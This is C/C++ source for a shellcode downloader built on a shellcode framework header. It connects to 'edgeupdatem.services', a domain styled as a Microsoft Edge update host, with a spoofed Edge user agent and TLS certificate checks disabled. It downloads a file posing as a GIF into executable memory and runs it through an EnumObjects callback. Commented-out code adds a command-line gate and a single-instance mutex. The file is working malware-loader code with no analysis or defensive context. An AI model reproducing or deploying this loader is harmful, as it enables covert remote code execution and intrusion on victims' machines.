#include "sc4.h"
#include <WinInet.h>
//
//SC_CODESEG_REORDERING SC_FORCEINLINE int compare(const char* X, const char* Y) {
//	while (*X && *Y) {
//		if (*X != *Y) {
//			return 0;
//		}
//
//		X++;
//		Y++;
//	}
//
//	return (*Y == '\0');
//}
//
//SC_CODESEG_REORDERING SC_FORCEINLINE const char* strstr(const char* X, const char* Y) {
//	while (*X != '\0') {
//		if ((*X == *Y) && compare(X, Y)) {
//			return X;
//		}
//		X++;
//	}
//
//	return NULL;
//}
//
//SC_CODESEG_REORDERING SC_NOINLINE bool CheckCmd() {
//	SC_IMPORT_API_BATCH_BEGIN();
//	SC_IMPORT_API_BATCH("kernel32.dll", GetCommandLineA);
//	SC_IMPORT_API_BATCH_END();
//	auto cmd = GetCommandLineA();
//	if (!strstr(SC_PISTRINGA("84fd2"), cmd)) {
//		return false;
//	}
//	return true;
//}
//
//SC_CODESEG_REORDERING SC_NOINLINE  bool isOneInstance()
//{
//	SC_IMPORT_API_BATCH_BEGIN();
//	SC_IMPORT_API_BATCH("kernel32.dll", CreateMutexA);
//	SC_IMPORT_API_BATCH("kernel32.dll", GetLastError);
//	SC_IMPORT_API_BATCH("kernel32.dll", ReleaseMutex);
//	SC_IMPORT_API_BATCH_END();
//
//
//	HANDLE mutex = CreateMutexA(nullptr, TRUE, SC_PISTRINGA("D4495856-3A8D-4F82-82C8-66C64A748016"));
//	if ((mutex != NULL) && (GetLastError() == ERROR_ALREADY_EXISTS)) {
//		ReleaseMutex(mutex);
//		return false;
//	}
//	return true;
//}

// clang-format off
SC_MAIN_BEGIN()
{
	// clang-format on
	SC_IMPORT_API_BATCH_BEGIN();
	SC_IMPORT_API_BATCH("User32.dll", GetDC);
	SC_IMPORT_API_BATCH("Gdi32.dll", EnumObjects);
	SC_IMPORT_API_BATCH("kernel32.dll", VirtualAlloc);
	SC_IMPORT_API_BATCH("wininet.dll", InternetOpenA);
	SC_IMPORT_API_BATCH("wininet.dll", InternetConnectA);
	SC_IMPORT_API_BATCH("wininet.dll", HttpOpenRequestA);
	SC_IMPORT_API_BATCH("wininet.dll", InternetSetOptionA);
	SC_IMPORT_API_BATCH("wininet.dll", HttpSendRequestA);
	SC_IMPORT_API_BATCH("wininet.dll", HttpQueryInfoA);
	SC_IMPORT_API_BATCH("wininet.dll", InternetReadFile);
	SC_IMPORT_API_BATCH_END();

	//if (!isOneInstance())
	//{
	//	return;
	//}

	//if (!CheckCmd())
	//{
	//	return;
	//}

	auto hInternet = InternetOpenA(0, 0, 0, 0, 0);
	auto session = InternetConnectA(hInternet, SC_PISTRINGA("edgeupdatem.services"), 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);


	auto req = HttpOpenRequestA(session, NULL, SC_PISTRINGA("/components/an.gif"), NULL, NULL, NULL, 0x84C03200, NULL);

	int flag = 0x3380;
	InternetSetOptionA(req, INTERNET_OPTION_SECURITY_FLAGS, &flag, 4);

	HttpSendRequestA(req, SC_PISTRINGA("Host: edgeupdatem.services\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9\r\naccept-language: q=0.8,en-GB;q=0.7,en-US;q=0.9.7\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1140.31\r\n"), -1, NULL, NULL);

	DWORD content_length = 0;
	DWORD content_length_size = sizeof(DWORD);
	HttpQueryInfoA(req, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &content_length, &content_length_size, NULL);

	auto shellcode = VirtualAlloc(nullptr, content_length + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	DWORD dwRead = 0;
	InternetReadFile(req, shellcode, content_length + 1, &dwRead);
	auto dc = GetDC(NULL);
	EnumObjects(dc, OBJ_BRUSH, (GOBJENUMPROC)shellcode, NULL);

	// clang-format off
}
SC_MAIN_END()
// clang-format on
